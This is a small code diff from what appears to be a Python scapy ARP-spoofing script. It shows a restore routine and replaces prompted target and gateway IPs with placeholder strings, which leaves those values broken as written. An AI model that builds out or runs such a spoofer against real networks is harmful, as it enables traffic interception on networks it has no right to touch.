@@ -24,8 +24,8 @@ def restore (destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose = False)
 
-target_ip = input("Enter your target ip : ")
-gateway_ip =input("Enter your gateway ip : ")
+target_ip = "Enter your target ip "  #target ip
+gateway_ip = "Enter your gateway ip/ spoof if" #spoof ip
 
 packet_count = 2
 try:
